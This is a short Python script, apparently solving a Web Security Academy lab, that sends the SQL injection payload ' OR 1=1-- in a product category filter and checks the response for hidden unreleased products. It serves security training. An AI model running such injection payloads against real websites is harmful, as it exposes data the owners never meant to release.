import requests
import urllib.parse

TARGET = "https://0a9b00350425cc4180f6124f00ee00a3.web-security-academy.net/filter"
payload = "' OR 1=1--"

url = f"{TARGET}?category={urllib.parse.quote(payload)}"
response = requests.get(url)

print(f"Status: {response.status_code}")
print(f"Length: {len(response.text)}")

# Unreleased products check karein
if "Vintage Neck Defender" in response.text:
    print("✅ Hidden products found!")
else:
    print("❌ No hidden products")
